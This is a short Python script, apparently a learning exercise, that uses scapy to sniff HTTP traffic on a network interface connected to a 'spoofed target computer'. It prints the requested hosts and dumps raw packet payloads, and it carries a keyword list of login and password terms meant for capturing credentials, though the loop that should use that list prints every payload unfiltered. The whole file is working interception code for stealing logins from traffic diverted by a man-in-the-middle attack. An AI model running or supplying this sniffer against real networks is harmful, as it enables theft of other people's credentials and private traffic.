#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


#create a function that will sniff our interface that's communicating with the spoofed target computer,
# #store=False because we dont want to store the values in our computer, prn argument to run a callback function
#  everytime we receive a packet
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


#since the prn arguments takes a packet, we then declare what we'll be doing in this packet.In this case, printing it
def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet[http.HTTPRequest].Host)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw]
            keywords =['username', 'user', 'pass', 'password', 'login']
            for word in keywords:
                print(load)
                break


sniff('eth0')